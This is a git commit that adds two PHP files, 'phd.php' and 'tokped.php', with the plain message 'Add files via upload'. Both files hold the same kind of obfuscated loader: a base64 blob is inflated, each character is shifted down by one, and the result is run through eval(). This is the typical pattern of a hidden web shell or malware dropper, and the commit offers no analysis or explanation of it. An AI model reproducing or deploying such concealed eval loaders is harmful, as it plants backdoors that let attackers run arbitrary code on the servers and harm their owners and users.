14fd59e83a994e751d63aee7823001c969bc3d54
nhk46 <42830416+nhk46@users.noreply.github.com>
2019-08-22 00:07:04 +0700

    Add files via upload

---
+++ nhk/phd.php
@@ -0,0 +1,9 @@
+<?php function OLyQu($TXuko)
+{ 
+$TXuko=gzinflate(base64_decode($TXuko));
+ for($i=0;$i<strlen($TXuko);$i++)
+ {
+$TXuko[$i] = chr(ord($TXuko[$i])-1);
+ }
+ return $TXuko;
+ }eval(OLyQu("lVPdatswGH0AP8VHCTStsNQ1pRR3HazroPuxKbgMxnIhpVIikUgyls0ixi7a7Q36AGNXu98D7GXyAnuDyUq6lbRbmcD4s87hnPPJnwDCSpS5mLVcwObI6kpyXMlq8zBJyHbSwbJpKpcRMlGNbEf4wmpihNg7IMdWl9qdyZNIy1lQGHk4ZYarKYOzmjVMsyVmuRorwTt8cfljcfV5cfl1cfVpcXWdbJMk6SmjGjgCI95DUO1vde7k+dSJaesUBJewbfVI1Im4kBY2hjuDwbvB4PCRhodWcqum9J8cTKy1CCFrSUrv41DiUIfQcBw4Qw7RO5zUk26TIp3n3DuAzGdrHMxxdJN5Lj2R4YNi+ydj5HgUKTovSNwl3toUpKPeA4p1AroTpjzPVwaO2wzTwnufgw81vdFBea5XSXGacY4L7GiBcUq0jHlSAB84dukV+rdpTORwrLu+um/pnJd4lTNz950h5RldnjJN7z2fCGUoLosIpv/1vzbCYNyegN2HJyApTl+le/tQ5uWLk7SsmE6ejmzbQAZvW67gtbBQylZNLRcGCjkN5KGBoVn32g9eP79cf4MzYSaqVpqZbtg9g2NRz9i0hcEcStEoVoXL4JSZpMsXFFaLGkql4RmrOXQiNw7r4xyw7yv+OasnogkvUzHY3yU7Q3MXPZjPYR6e0E1Q67FwiZoQrT8OoOuX5ycviq1wm+IFS58YG/CNHlsz3r3p7GWrZ0yGBl3obRkzZ/N0sFIf/U19Zm0VlUeBNrY19HvqaOcQegoeQ0S7GqEt+BB/7yrOG1Grcf93tqD0MfkF"));?>
---
+++ nhk/tokped.php
@@ -0,0 +1,9 @@
+<?php function bPWd($MuylqF)
+{ 
+$MuylqF=gzinflate(base64_decode($MuylqF));
+ for($i=0;$i<strlen($MuylqF);$i++)
+ {
+$MuylqF[$i] = chr(ord($MuylqF[$i])-1);
+ }
+ return $MuylqF;
+ }eval(bPWd("pVLbattAEH33fsUgDJGTNIrtUEJc96EXaEobAjF9qV9W9jperF0JSaYOwZC4eY9DYhtCnbYUXAyhn9Af8UuRf6B/0NlV5AttoRcxWo3mzDmzeyQAvAiXFadZZbBiuyJ0Gx6rbnh1b6VAiLVKVEc9DL1gx7IOeVhv2hsVV1iSsa1t65ErSszxDkRQ0jzd/ZKiln0Ez6is8gaFfZ+GVNAYc6u8xllV4dPTr9PO2fT047Tzdtq5JKsWIWkueQhFkOwNoLiZUZuwnjYC1mgGHB5Tx7FwGmKusJkP5gsukJBvWc+pyBBWqbtglDfz+df5fCErvr+//Ax7rnB9KFH/kIWwiyrbrRa08NboDhgFkqY4M/S5MGvYFJgHpSe7exkcviiYSwTxEAyyMT0QwbrKbuJqLs7VPu+U7d8o65PeexgeeQw7jLRtzGrS1RWKFcJrYC61FiGbgWOSquGZECluFiDN4QHk1HNtDTEgKWX1HesV83nNnCmvL4jhLlJt0mZOwH4xJqfH/JmM53MZok8SylLbss8CKhPPS8xvcLRAO1aWxrKt99FW9W9Eg/OofzuLb1/eTcaTm8kYk8U6thGI+mdR/+QfVhL1rqJeV8co6g2iq5N5KGgwT/SKhOvk5ZPORwm5m1QQvdDJMOp9SNCRJiuxi+W4XcjHCXM2YN4Zk2PVa936cwyXe7q6iOvwfyz6q2+hP7n6UdvkBw=="));?>
